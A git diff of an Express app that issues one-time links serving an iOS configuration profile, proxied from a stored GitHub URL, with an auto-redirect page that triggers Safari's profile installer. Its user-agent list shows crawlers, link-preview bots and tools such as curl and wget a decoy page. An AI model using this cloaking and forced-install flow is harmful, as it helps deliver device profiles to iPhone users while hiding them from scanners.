@@ -7,7 +7,7 @@ const fs = require('fs');
 const app = express();
 app.use(express.json());
 
-// Upstash Redis - env vars auto-set by Vercel when you link Upstash Redis
+// Upstash Redis
 const redis = new Redis({
     url: process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL,
     token: process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN,
@@ -15,7 +15,6 @@ const redis = new Redis({
 
 // --- API Routes ---
 
-// Get current config
 app.get('/api/config', async (req, res) => {
     try {
         const githubUrl = await redis.get('config:githubUrl') || '';
@@ -25,12 +24,10 @@ app.get('/api/config', async (req, res) => {
     }
 });
 
-// Set GitHub URL
 app.post('/api/config', async (req, res) => {
     try {
         const { githubUrl } = req.body;
         if (!githubUrl) return res.status(400).json({ error: 'GitHub URL is required' });
-
         await redis.set('config:githubUrl', githubUrl);
         res.json({ success: true, githubUrl });
     } catch (err) {
@@ -38,7 +35,6 @@ app.post('/api/config', async (req, res) => {
     }
 });
 
-// Create a new temporary link
 app.post('/api/create-link', async (req, res) => {
     try {
         const githubUrl = await redis.get('config:githubUrl');
@@ -64,12 +60,10 @@ app.post('/api/create-link', async (req, res) => {
     }
 });
 
-// Get all links
 app.get('/api/links', async (req, res) => {
     try {
         const linkIds = await redis.lrange('links', 0, -1) || [];
         const links = [];
-
         for (const id of linkIds) {
             const raw = await redis.get(`link:${id}`);
             if (raw) {
@@ -77,14 +71,12 @@ app.get('/api/links', async (req, res) => {
                 links.push(link);
             }
         }
-
         res.json({ links });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
 });
 
-// Delete a link
 app.delete('/api/links/:id', async (req, res) => {
     try {
         const id = req.params.id;
@@ -96,11 +88,9 @@ app.delete('/api/links/:id', async (req, res) => {
     }
 });
 
-// Clear all used links
 app.delete('/api/links-used', async (req, res) => {
     try {
         const linkIds = await redis.lrange('links', 0, -1) || [];
-
         for (const id of linkIds) {
             const raw = await redis.get(`link:${id}`);
             if (raw) {
@@ -111,28 +101,22 @@ app.delete('/api/links-used', async (req, res) => {
                 }
             }
         }
-
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
 });
 
-// --- Bot detection (link preview bots from messaging apps) ---
+// --- Bot detection ---
 function isBot(userAgent) {
     if (!userAgent) return false;
     const bots = [
         'facebookexternalhit', 'Facebot', 'FacebookBot',
         'ZaloBot', 'ZaloMessageBot',
-        'TelegramBot',
-        'WhatsApp',
-        'Viber',
-        'Discordbot',
-        'Twitterbot',
-        'Slackbot', 'Slack-ImgProxy',
-        'LinkedInBot',
-        'Googlebot', 'bingbot',
-        'PetalBot', 'Bytespider',
+        'TelegramBot', 'WhatsApp', 'Viber',
+        'Discordbot', 'Twitterbot',
+        'Slackbot', 'Slack-ImgProxy', 'LinkedInBot',
+        'Googlebot', 'bingbot', 'PetalBot', 'Bytespider',
         'bot', 'crawler', 'spider', 'preview',
         'curl', 'wget', 'python-requests', 'HeadlessChrome',
     ];
@@ -140,45 +124,116 @@ function isBot(userAgent) {
     return bots.some(b => ua.includes(b.toLowerCase()));
 }
 
-// --- Temporary Link Redirect ---
+// ============================================================
+// STEP 1: User clicks /d/:id → marks as used → shows loading
+//         page that auto-redirects to /d/:id/install.mobileconfig
+// ============================================================
 app.get('/d/:id', async (req, res) => {
     try {
         const id = req.params.id;
         const raw = await redis.get(`link:${id}`);
 
         if (!raw) {
-            const expiredPath = path.join(__dirname, '..', 'public', 'expired.html');
-            const html = fs.readFileSync(expiredPath, 'utf-8');
+            const html = fs.readFileSync(path.join(__dirname, '..', 'public', 'expired.html'), 'utf-8');
             return res.status(410).send(html);
         }
 
         const link = typeof raw === 'string' ? JSON.parse(raw) : raw;
 
         if (link.used) {
-            const expiredPath = path.join(__dirname, '..', 'public', 'expired.html');
-            const html = fs.readFileSync(expiredPath, 'utf-8');
+            const html = fs.readFileSync(path.join(__dirname, '..', 'public', 'expired.html'), 'utf-8');
             return res.status(410).send(html);
         }
 
-        // If it's a bot/crawler (link preview), return simple page WITHOUT marking as used
+        // Bot → don't consume
         const userAgent = req.get('User-Agent') || '';
         if (isBot(userAgent)) {
-            return res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Download File</title></head><body><p>Click to download</p></body></html>');
+            return res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Download</title></head><body><p>Download file</p></body></html>');
         }
 
-        // Real user click — mark as used
+        // Mark as used + set a short-lived token (60s) for the file download
         link.used = true;
         link.usedAt = new Date().toISOString();
         await redis.set(`link:${id}`, JSON.stringify(link));
+        await redis.set(`download:${id}`, 'allowed', { ex: 60 });
 
-        // Get config and redirect
-        const githubUrl = await redis.get('config:githubUrl');
-        res.redirect(githubUrl);
+        // Serve an intermediate page that redirects to the .mobileconfig URL
+        // Safari needs to see .mobileconfig extension to trigger profile installation
+        res.send(`<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Đang tải hồ sơ...</title>
+  <style>
+    body { background: #0a0a1a; color: #e8e8f0; font-family: -apple-system, sans-serif;
+           display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+    .box { text-align: center; }
+    .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1);
+               border-top-color: #6c5ce7; border-radius: 50%; animation: spin 0.8s linear infinite;
+               margin: 0 auto 16px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    p { color: #8888aa; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="spinner"></div>
+    <p>Đang tải hồ sơ cấu hình...</p>
+  </div>
+  <script>
+    // Redirect to .mobileconfig URL so Safari triggers profile installer
+    setTimeout(function() {
+      window.location.href = '/d/${id}/install.mobileconfig';
+    }, 500);
+  </script>
+</body>
+</html>`);
     } catch (err) {
         res.status(500).send('Server error: ' + err.message);
     }
 });
 
-// Export as Vercel serverless handler
-module.exports = app;
+// ============================================================
+// STEP 2: /d/:id/install.mobileconfig → proxy download the file
+//         Safari sees .mobileconfig extension → opens profile installer
+//         Only works within 60s of step 1 (download token)
+// ============================================================
+app.get('/d/:id/install.mobileconfig', async (req, res) => {
+    try {
+        const id = req.params.id;
 
+        // Check download token (set in step 1, expires after 60s)
+        const allowed = await redis.get(`download:${id}`);
+        if (!allowed) {
+            const html = fs.readFileSync(path.join(__dirname, '..', 'public', 'expired.html'), 'utf-8');
+            return res.status(410).send(html);
+        }
+
+        // Delete download token (one-time use)
+        await redis.del(`download:${id}`);
+
+        // Proxy download — fetch from original URL, serve to user
+        const originalUrl = await redis.get('config:githubUrl');
+        const response = await fetch(originalUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0' },
+            redirect: 'follow',
+        });
+
+        if (!response.ok) {
+            return res.status(502).send('Could not fetch file');
+        }
+
+        // Correct headers for .mobileconfig → iOS automatically installs profile
+        res.setHeader('Content-Type', 'application/x-apple-asn1');
+        res.setHeader('Referrer-Policy', 'no-referrer');
+        res.setHeader('Cache-Control', 'no-store, no-cache');
+
+        const buffer = Buffer.from(await response.arrayBuffer());
+        res.send(buffer);
+    } catch (err) {
+        res.status(500).send('Server error: ' + err.message);
+    }
+});
+
+module.exports = app;
